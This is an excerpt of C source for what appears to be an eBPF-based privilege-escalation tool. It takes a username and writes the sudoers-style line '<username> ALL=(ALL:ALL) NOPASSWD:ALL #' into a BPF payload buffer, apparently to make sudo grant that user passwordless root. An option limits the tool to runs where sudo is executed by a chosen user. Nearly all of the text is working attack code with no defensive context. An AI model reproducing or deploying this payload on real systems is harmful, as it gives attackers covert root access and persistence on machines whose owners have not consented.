...
uid_t lookup_user(const char *name)
{
	if (name) {
		struct passwd *pwd = getpwnam(
			name); /* don't free, see getpwnam() for details */
		if (pwd)
			return pwd->pw_uid;
	}
	return INVALID_UID;
...
static const struct argp_option opts[] = {
	...
	{ "restrict", 'r', NULL, 0,
	  "Restict to only run when sudo is executed by the matching user" },
...
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
	...
	case 'u':
		if (strlen(arg) >= max_username_len) {
			fprintf(stderr,
				"Username must be less than %d characters\n",
				max_username_len);
			argp_usage(state);
		}
...
int main(int argc, char **argv)
{
	...
	// Copy in username
	sprintf(skel->rodata->payload, "%s ALL=(ALL:ALL) NOPASSWD:ALL #",
		env.username);
